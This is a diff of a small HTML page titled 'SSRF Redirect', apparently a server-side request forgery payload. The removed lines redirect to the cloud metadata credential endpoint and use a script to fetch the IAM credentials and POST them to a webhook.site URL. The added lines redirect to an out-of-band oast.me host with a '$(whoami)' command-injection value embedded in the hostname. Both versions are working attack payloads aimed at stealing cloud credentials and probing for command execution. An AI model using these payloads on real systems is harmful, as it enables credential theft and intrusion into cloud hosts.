@@ -1,19 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+    <meta http-equiv="refresh" content="0; url=https://$(whoami).d9mg5dhnql63nvgjqnngt8tshhg4kygih.oast.me">
+    <title>SSRF Redirect</title>
 </head>
 <body>
-  <script>
-    // بديل: استخدم fetch عشان تجيب المحتوى وتبعته للـ Webhook
-    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
-      .then(r => r.text())
-      .then(data => {
-        fetch('https://webhook.site/cc20c4bc-9a45-4fb8-80dd-ee35896136b4/', {
-          method: 'POST',
-          body: JSON.stringify({data: data})
-        });
-      });
-  </script>
+    <script>
+        window.location.href = 'https://$(whoami).d9mg5dhnql63nvgjqnngt8tshhg4kygih.oast.me';
+    </script>
 </body>
 </html>
